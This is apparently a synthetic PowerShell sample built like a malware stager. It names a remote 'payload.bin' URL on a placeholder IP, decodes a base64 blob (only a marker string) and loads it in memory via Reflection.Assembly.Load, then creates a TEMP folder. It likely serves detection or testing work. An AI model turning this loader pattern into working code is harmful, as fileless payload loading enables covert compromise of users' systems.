[CmdletBinding()]
param(
    [string]$FetchUrl = 'https://203.0.113.198/payload.bin',
    [int]$TimeoutSec = 37
)
$ErrorActionPreference = "Stop"

try {
    $ManagedBytes = [Convert]::FromBase64String('c3RhZ2UyLW1hcmtlcjp4eGtseGdldWhh')
    Write-Verbose ("Assembly byte count: " + $ManagedBytes.Length)
    $StageResult = [Reflection.Assembly]::Load($ManagedBytes)
    if ($null -ne $StageResult) {
        Write-Verbose ("Loaded assembly: " + $StageResult.FullName)
    }
}
catch {
    Write-Warning "Assembly load failed: $($_.Exception.Message)"
}

Write-Output "stage 42 initialized"
$null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force
